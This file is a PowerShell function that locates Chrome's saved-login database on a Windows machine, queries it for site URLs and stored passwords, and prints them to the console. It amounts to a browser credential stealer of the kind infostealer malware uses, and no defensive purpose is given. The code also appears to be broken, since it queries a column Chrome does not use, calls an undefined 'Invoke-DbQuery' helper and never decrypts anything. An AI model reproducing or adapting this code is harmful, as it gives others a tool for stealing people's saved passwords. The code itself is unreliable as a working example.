# Function to extract passwords from Chrome
function Extract-ChromePasswords {
    $ChromeDatabasePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

    try {
        if (Test-Path $ChromeDatabasePath) {
            $ChromePasswords = Invoke-DbQuery -Database $ChromeDatabasePath -Query "SELECT url, value FROM logins"

            if ($ChromePasswords) {
                foreach ($Password in $ChromePasswords) {
                    $url = $Password.url
                    $password = $Password.value
                    Write-Host "Chrome - URL: $url, Password: $password"
                }
            } else {
                Write-Host "No Chrome passwords found."
            }
        } else {
            Write-Host "Chrome database not found."
        }
    }
    catch {
        Write-Host "Error extracting Chrome passwords: $($_.Exception.Message)"
    }
}

